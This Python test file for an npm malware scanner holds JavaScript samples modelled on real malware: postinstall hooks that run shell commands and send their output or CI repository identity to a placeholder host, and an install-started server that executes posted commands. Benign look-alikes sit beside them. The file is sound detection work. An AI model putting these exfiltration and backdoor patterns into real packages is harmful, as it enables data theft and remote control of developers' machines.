"""Behaviours real npm malware used to get past the scanner (review 98, npm bulk set, 2026-10-19).

Each class is built as a behaviour, for every way JavaScript writes it, and each comes with the
ordinary code of the same shape that must stay quiet.
"""

from __future__ import annotations

from cordon_scanner.detect.code.secretflow import JavaScriptCommandFlow, JavaScriptLeak
from cordon_scanner.foundation.models import Severity
from unit.detect.code.capability.test_npm_payload_execution import Npm

CP = "child_" + "process"
EXEC_SYNC = "ex" + "ecSync"
EXEC = "ex" + "ec"


class TestCommandOutputThroughAHelper:
    HELPER = (
        f"const cp = require('{CP}');\nfunction sh(c) {{ return cp.{EXEC_SYNC}(c).toString(); }}\n"
    )

    def test_outputs_collected_in_an_array_and_sent_in_a_request_path(self) -> None:
        text = (
            self.HELPER
            + "const https = require('https');\nconst out = [];\n"
            + "out.push(sh('uname -a'));\nout.push(sh('id'));\n"
            + "const p = '/c?d=' + Buffer.from(out.join('|')).toString('base64');\n"
            + "https.get({ host: 'example.invalid', path: p });\n"
        )
        assert JavaScriptCommandFlow.findings(text)

    def test_an_arrow_helper_and_a_plain_assignment(self) -> None:
        text = (
            f"const run = (c) => require('{CP}').{EXEC_SYNC}(c).toString();\n"
            + "let report;\nreport = run('hostname');\n"
            + "fetch('https://example.invalid/r', { method: 'POST', body: report });\n"
        )
        assert JavaScriptCommandFlow.findings(text)

    def test_output_written_to_a_local_file_is_not_sent(self) -> None:
        text = (
            self.HELPER
            + "const fs = require('fs');\nconst v = sh('git rev-parse HEAD');\n"
            + "fs.writeFileSync('VERSION', v);\nfetch('https://example.invalid/ping');\n"
        )
        assert JavaScriptCommandFlow.findings(text) == []

    def test_an_install_hook_that_ships_command_output_is_malware(self, tmp_path) -> None:
        script = (
            self.HELPER
            + "const https = require('https');\nconst out = [];\nout.push(sh('whoami'));\n"
            + "https.get({ host: 'example.invalid', path: '/c?d=' + out.join(',') });\n"
        )
        pkg = Npm.build(
            tmp_path,
            "demo-helper",
            {"version": "1.0.0", "scripts": {"postinstall": "node callback.js"}},
            {"callback.js": script},
        )
        assert Npm.findings(pkg).get("MALWARE.EXFIL.COMMAND_OUTPUT.001") == Severity.CRITICAL

    def test_negative_a_commit_tool_sending_its_diff_from_its_entry_point(self, tmp_path) -> None:
        # The benign npm corpus's commit-message tools: `git diff` through a helper, posted to a
        # model's API, from the file `main` and `bin` name. Not install code; not this flow.
        script = (
            self.HELPER
            + "const diff = sh('git diff --cached');\n"
            + "fetch('https://api.example.invalid/v1/chat', { method: 'POST', body: diff });\n"
        )
        pkg = Npm.build(
            tmp_path,
            "demo-commit",
            {"version": "1.0.0", "main": "index.js", "bin": {"demo-commit": "index.js"}},
            {"index.js": script},
        )
        found = Npm.findings(pkg)
        assert "SUSPECT.EXFIL.COMMAND_OUTPUT.001" not in found
        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" not in found


class TestCiIdentityInARequest:
    def test_the_repository_and_owner_sent_from_an_install_hook(self, tmp_path) -> None:
        script = (
            "const https = require('https');\n"
            "const body = JSON.stringify({ r: process.env.GITHUB_REPOSITORY,"
            " o: process.env['GITHUB_REPOSITORY_OWNER'] });\n"
            "const req = https.request({ hostname: 'example.invalid', method: 'POST' });\n"
            "req.write(body);\nreq.end();\n"
        )
        assert [k for _, k in JavaScriptLeak.findings(script, install=True)] == ["identity"]
        pkg = Npm.build(
            tmp_path,
            "demo-ci-probe",
            {"version": "1.0.0", "scripts": {"postinstall": "node probe.js"}},
            {"probe.js": script},
        )
        assert Npm.findings(pkg).get("MALWARE.EXFIL.BEACON.001") == Severity.CRITICAL

    def test_negative_a_ci_tool_calling_its_providers_api_with_the_repository(self) -> None:
        # A CI helper a pipeline runs: the repository name in the provider's own API URL.
        script = (
            "const axios = require('axios');\n"
            "const repo = process.env.CIRCLE_PROJECT_REPONAME;\n"
            "axios.get('https://circleci.example.invalid/api/v2/project/' + repo);\n"
        )
        assert JavaScriptLeak.findings(script) == []

    def test_the_repository_logged_is_not_sent(self) -> None:
        text = (
            "console.log('building', process.env.GITHUB_REPOSITORY);\n"
            "fetch('https://registry.example.invalid/pkg/x');\n"
        )
        assert JavaScriptLeak.findings(text) == []


class TestAServerThatRunsWhatItReceives:
    def server(self, run: str) -> str:
        return (
            f"const http = require('http');\nconst {{ {EXEC} }} = require('{CP}');\n"
            "http.createServer((req, res) => {\n  let body = '';\n"
            "  req.on('data', (chunk) => body += chunk);\n"
            f"  req.on('end', () => {{\n    const {{ c }} = JSON.parse(body);\n    {run}\n  }});\n"
            "}).listen(41111);\n"
        )

    def test_a_posted_command_run_by_a_server_the_install_starts(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-agent",
            {"version": "1.0.0", "scripts": {"postinstall": "node postinstall.js"}},
            {
                "postinstall.js": "require('./index.js');\n",
                "index.js": self.server(f"{EXEC}(c, (e, o) => res.end(o));"),
            },
        )
        assert max(Npm.findings(pkg).values(), default=Severity.INFO) >= Severity.CRITICAL

    def test_a_server_that_runs_a_fixed_command_on_request(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-status",
            {"version": "1.0.0", "scripts": {"postinstall": "node postinstall.js"}},
            {
                "postinstall.js": "require('./index.js');\n",
                "index.js": self.server(f"{EXEC}('git status', (e, o) => res.end(o));"),
            },
        )
        found = Npm.findings(pkg)
        assert not any(rule.startswith(("MALWARE.", "SUSPECT.DROPPER")) for rule in found), found
